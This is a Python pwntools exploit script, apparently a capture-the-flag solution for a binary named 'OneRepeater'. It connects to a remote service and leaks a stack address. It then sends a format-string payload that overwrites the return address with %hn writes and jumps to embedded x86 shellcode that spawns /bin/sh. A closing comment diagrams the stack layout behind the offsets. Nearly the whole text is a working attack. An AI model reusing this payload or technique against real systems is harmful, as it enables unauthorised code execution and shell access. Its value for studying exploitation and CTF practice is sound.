from pwn import *
io = remote('140.82.19.20',36427)#process('OneRepeater')
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

io.recvuntil('3) Exit\n')
io.sendline("1")
readbuffer_addr = int(io.recv(8), 16)
shellcode_addr = readbuffer_addr + 0x40
ret_addr = readbuffer_addr - 0x24
print "read buffer address: " + hex(readbuffer_addr)

offset = 16
payload = p32(ret_addr) + '%' + str((shellcode_addr & 0xffff) - 4) + 'd%' + str(offset) + '$hn' + 'aaa' + p32(ret_addr + 2) + '%' + str(((shellcode_addr >> 16) & 0xffff) - (shellcode_addr & 0xffff) - 7) + 'd%' + str(offset + 5) + '$hn'
payload += 'a' * (0x40 - len(payload)) + shellcode

io.send(payload)
sleep(1)
io.sendline("2")
io.recvuntil(shellcode)

io.interactive()

'''
To illustrate why we write payload in that way
This is an example stack layout, supposing the leak address is 0xffffc970

      *---------------*
c930  |  0xffffc970   |  (addr of format string)
      *---------------*
c934  |  xxxxxxxxxx   |  1$ (first parameter of printf)
      *---------------*
           .....
      *---------------*
c94c  |  return addr  |  7$
      *---------------*
           .....
      *---------------*
c970  |  0xffffc94c   | 16$ (start addr of read buffer)
      *---------------*
c974  |    "%516"     | 17$ (51628 = 0xc9b0 - 4)
      *---------------*
c978  |    "28d%"     | 18$
      *---------------*
c97c  |    "16$h"     | 19$
      *---------------*
c980  |    "naaa"     | 20$
      *---------------*
c984  |  0xffffc94e   | 21$
      *---------------*
c988  |    "%138"     | 22$ (13869 = 0xffff - 0xc9b0 - 4 - 3)
      *---------------*
c98c  |    "69d%"     | 23$
      *---------------*
c990  |    "21$h"     | 24$
      *---------------*
c994  |    "naaa"     | 25$
      *---------------*
c998  |    "aaaa"     | 26$
      *---------------*
           .....
      *---------------*
c9b0  |               |
      |   shellcode   |
      |               |
      *---------------*
'''